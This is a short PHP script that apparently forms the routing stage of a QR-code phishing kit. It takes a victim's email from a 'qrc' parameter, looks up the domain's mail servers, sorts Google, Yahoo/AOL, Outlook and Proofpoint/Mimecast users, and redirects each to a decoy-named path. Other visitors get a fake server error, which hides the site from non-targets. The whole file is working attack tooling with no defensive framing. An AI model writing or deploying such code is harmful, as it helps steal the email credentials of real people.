<?php

session_start();
error_reporting(0);
$email = $_GET['qrc'];
$email = urldecode($email);



function contains(array $arr, $str) {
    foreach($arr as $a) {
        if (stripos($a,$str) !== false) return true;
    }
    return false;
}

if (preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/i", $email)) {

    $statusCode = 0;

    list($alias, $domain) = explode("@", $email);

    if (checkdnsrr($domain, "MX")) {
        getmxrr($domain, $mxhosts);
        if (contains($mxhosts, "google")) {
        	$is_vip = getenv('IS_VIP');
            if ($is_vip) {
                $emailProvider = "/nature/nourishes/nirvana";
            } else {
                $emailProvider = "";
                $statusCode = 1;
            }

        } else if (contains($mxhosts, "yahoo")) {
        	if (contains($mxhosts, "aol") !== false) {
        		$emailProvider = "/patience/propels/peace";
        	} else {
        		$emailProvider = "/mountains/inspire/serenity";
        	}

        } elseif (contains($mxhosts, "pphosted") 
        || contains($mxhosts, "outlook")
        || contains($mxhosts, "mimecast") 
        || contains($mxhosts, "ppe-hosted")) {

            if (strpos($email, "outlook") || strpos($email, "hotmail") || strpos($email, "live")) {

                $emailProvider = "/creativity/invigorates/mind";
            } else {

        	    $emailProvider = "/discovery/unveils/knowledge";
            }
        }
        else {
        	$statusCode = 1;
        }
       
    } else {
        $statusCode = 1;
        $emailProvider = "";

    }
} else {
    $statusCode = 1;
    $emailProvider = "";
}

if ($statusCode === 1) {
    die("INTERNAL SERVER ERROR");
} else {
    header("Location: ".$emailProvider . "?qrc=" . $email);
}

// echo json_encode($result);

?>